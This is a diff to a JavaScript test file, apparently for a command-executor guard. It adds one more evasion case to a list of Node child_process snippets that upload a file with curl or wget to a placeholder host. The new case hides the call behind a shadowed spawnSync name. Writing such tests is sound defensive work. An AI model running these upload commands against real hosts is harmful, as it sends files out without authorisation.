@@ -121,6 +121,7 @@ test("executor shell strings and argv arrays retain protection across wrappers a
     "const {spawnSync:run}=require('child_process');run('curl',['-T','synthetic.txt','https://example.invalid'])",
     "const {execFileSync:run}=require('child_process');run('wget',['--post-file','synthetic.txt','https://example.invalid'])",
     "import {spawnSync as run} from 'node:child_process';run('curl',['-T','synthetic.txt','https://example.invalid'])",
+    "{const {execSync:spawnSync}=require('child_process');}require('child_process').spawnSync('curl',['-T','synthetic.txt','https://example.invalid'])",
   ];
   for (const body of bodies)
     for (const command of [
